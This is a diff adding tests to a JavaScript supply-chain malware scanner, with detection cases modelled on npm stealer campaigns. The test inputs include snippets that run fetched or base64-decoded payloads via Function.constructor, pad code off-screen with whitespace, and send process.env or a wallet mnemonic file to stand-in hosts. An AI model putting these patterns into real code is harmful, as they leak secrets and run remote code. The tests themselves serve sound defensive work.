@@ -125,3 +125,149 @@ test("browser profile theft is still caught; bare mnemonic needs a file read plu
 	assert.deepEqual(rules(scan("w.js", "const mnemonic = generateMnemonic();")), []);
 	assert.equal(scan("w.js", "const m = fs.readFileSync('mnemonic.txt');\nfetch('https://x.example', { method: 'POST', body: m });").level, LEVEL.DANGER);
 });
+
+// ── New gap coverage (from malware-museum + contagious-interview research, 2026-11-13) ─────────
+
+// Sample 1 (Supply Chain / metrica-node): `new Function.constructor("require", payload)(require)`
+// is an alias for `new Function` that bypasses the simpler `Function(` check.
+test("Function.constructor used to execute downloaded payload is high (Sample 1 pattern)", () => {
+	// Pattern: decode a URL, fetch payload, execute via Function.constructor — common in metrica-node style attacks
+	const r = scan("lib/caller.js", "const handler = new Function.constructor('require', await axios.get(src).data);\nhandler(require);");
+	assert.ok(rules(r).includes("remote_code_load"), "Function.constructor with remote fetch should trigger remote_code_load");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("Function.constructor with base64 decoded payload is high", () => {
+	const r = scan("lib/loader.js", "new Function.constructor('return', Buffer.from(encoded, 'base64').toString())();");
+	assert.ok(rules(r).includes("decode_exec"), "Function.constructor with base64 should trigger decode_exec");
+});
+
+test("obj.Function.constructor and page.Function.constructor are not flagged (false-positive guard)", () => {
+	assert.deepEqual(rules(scan("x.js", "const f = page.Function.constructor('x', 'return x');")), []);
+	assert.deepEqual(rules(scan("x.js", "obj.Function.constructor('a', 'b');")), []);
+});
+
+// Sample 3 & 4 (Crypto/DAO stealers): Node.js built-ins listed as npm `dependencies`.
+// `child_process`, `fs`, `crypto`, `path` are built-ins — no npm install needed.
+// When an attacker wraps their payload in a fake package they still declare these to satisfy `require`.
+test("Node.js built-ins as npm dependencies are flagged (Samples 3 & 4 pattern)", () => {
+	const r = scan("package.json", JSON.stringify({
+		dependencies: { express: "^4.18.0", child_process: "^1.0.2", fs: "^0.0.1-security" },
+	}));
+	const ruleIds = rules(r);
+	assert.ok(ruleIds.includes("builtin_as_dep"), "child_process as dependency should be flagged");
+	assert.equal(ruleIds.filter((id) => id === "builtin_as_dep").length, 2, "both child_process and fs should be flagged");
+});
+
+test("Node.js built-ins in devDependencies are not flagged (some tools do this)", () => {
+	const r = scan("package.json", JSON.stringify({
+		devDependencies: { child_process: "^1.0.2", crypto: "^1.0.1" },
+	}));
+	assert.ok(!rules(r).includes("builtin_as_dep"), "devDependencies built-ins should not be flagged");
+});
+
+test("normal dependencies are not flagged as built-ins", () => {
+	const r = scan("package.json", JSON.stringify({
+		dependencies: { express: "^4.18.0", react: "^18.2.0", "next": "^14.0.0" },
+	}));
+	assert.deepEqual(rules(r), []);
+});
+
+// Samples 3, 4 & Lazarus Stage 1: whitespace-padding technique (1400+ spaces push payload off-screen).
+test("whitespace-hidden payload (500+ leading spaces before code) is flagged as high", () => {
+	const hiddenLine = " ".repeat(600) + "(function(_0x1a2b){return _0x1a2b})('x');";
+	const r = scan("routes/api/transactions.js", "const router = require('express').Router();\nmodule.exports = router;\n" + hiddenLine);
+	assert.ok(rules(r).includes("whitespace_hidden"), "whitespace-padded hidden code should be caught");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("normal indentation (up to 20 spaces) is not whitespace_hidden", () => {
+	const normalCode = "    ".repeat(4) + "const x = require('express');"; // 16 spaces
+	assert.deepEqual(rules(scan("server.js", normalCode)), []);
+});
+
+// BeaverTail / Lazarus Stage-1: explicitly serializing process.env into a network request body.
+// Sends JWT_SECRET, MONGO_URI, AWS keys, etc. in one HTTP call.
+test("serializing process.env into a network request body is high (BeaverTail pattern)", () => {
+	const r = scan("routes/api/auth.js",
+		"const params = new URLSearchParams({ processInfo: JSON.stringify(process.env), tid: 'x' });\n" +
+		"const res = await fetch(c2url + '?' + params);");
+	assert.ok(rules(r).includes("process_env_exfil"), "JSON.stringify(process.env) + fetch should be caught");
+	assert.equal(r.level, LEVEL.DANGER);
+});
+
+test("per-key process.env access with fetch is NOT flagged (normal Express/Next.js app)", () => {
+	// A real app that reads per-key env vars and also makes HTTP calls must not be flagged.
+	const r = scan("lib/api.js",
+		"const dbUrl = process.env.DATABASE_URL;\n" +
+		"const apiKey = process.env.API_KEY;\n" +
+		"const res = await fetch('https://api.example.com/data', { headers: { Authorization: `Bearer ${apiKey}` } });");
+	assert.ok(!rules(r).includes("process_env_exfil"), "per-key env access with fetch must not trigger process_env_exfil");
+});
+
+// Sample 5 (Typosquat via vite.config.js): a build config file that makes network requests is suspicious.
+// A Vite plugin with a network sink runs at build time with full filesystem access.
+test("network call inside a vite config file is flagged (Sample 5 / graphalgo pattern)", () => {
+	const r = scan("vite.config.js",
+		"import { defineConfig } from 'vite';\n" +
+		"import react from '@vitejs/plugin-react';\n" +
+		"import logger from 'eslints-logger';\n" +
+		"logger.init({ endpoint: 'https://collector.example.com' });\n" +
+		"fetch('https://collector.example.com/beacon');\n" +
+		"export default defineConfig({ plugins: [react()] });");
+	assert.ok(rules(r).includes("config_file_net"), "fetch inside vite.config.js should trigger config_file_net");
+});
+
+test("vite config without network calls is clean (normal project regression)", () => {
+	const r = scan("vite.config.ts",
+		"import { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\n" +
+		"export default defineConfig({ plugins: [react()], server: { port: 3000 } });");
+	assert.deepEqual(rules(r), [], "clean vite config should not be flagged");
+});
+
+test("tailwind config without network calls is clean (normal project regression)", () => {
+	const r = scan("tailwind.config.js",
+		"/** @type {import('tailwindcss').Config} */\nexport default {\n  content: ['./src/**/*.{js,ts,jsx,tsx}'],\n  theme: { extend: {} },\n  plugins: [],\n};");
+	assert.deepEqual(rules(r), [], "clean tailwind config should not be flagged");
+});
+
+// Regression: a typical Next.js / Express server uses process.env for config but must NOT be flagged.
+test("normal Next.js API route reading env vars and calling an external API is not flagged", () => {
+	const r = scan("src/app/api/data/route.ts",
+		"const apiBase = process.env.NEXT_PUBLIC_API_URL;\n" +
+		"const secret = process.env.API_SECRET;\n" +
+		"export async function GET() {\n" +
+		"  const res = await fetch(`${apiBase}/items`, { headers: { 'x-api-key': secret } });\n" +
+		"  return Response.json(await res.json());\n" +
+		"}");
+	assert.ok(!rules(r).includes("process_env_exfil"), "Next.js API route must not trigger process_env_exfil");
+	assert.equal(r.level, LEVEL.NONE);
+});
+
+// Regression: a normal Supabase + Express server must stay clean.
+test("normal Supabase/Express server is not flagged", () => {
+	const r = scanRepo([
+		{
+			path: "package.json",
+			content: JSON.stringify({
+				scripts: { start: "node server.js", dev: "nodemon server.js" },
+				dependencies: { express: "^4.18.0", "@supabase/supabase-js": "^2.39.0" },
+			}),
+		},
+		{
+			path: "server.js",
+			content:
+				"import express from 'express';\n" +
+				"import { createClient } from '@supabase/supabase-js';\n" +
+				"const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);\n" +
+				"const app = express();\n" +
+				"app.get('/items', async (req, res) => {\n" +
+				"  const { data } = await supabase.from('items').select('*');\n" +
+				"  res.json(data);\n" +
+				"});\n" +
+				"app.listen(3000);\n",
+		},
+	]);
+	assert.equal(r.level, LEVEL.NONE);
+	assert.deepEqual(r.findings, []);
+});
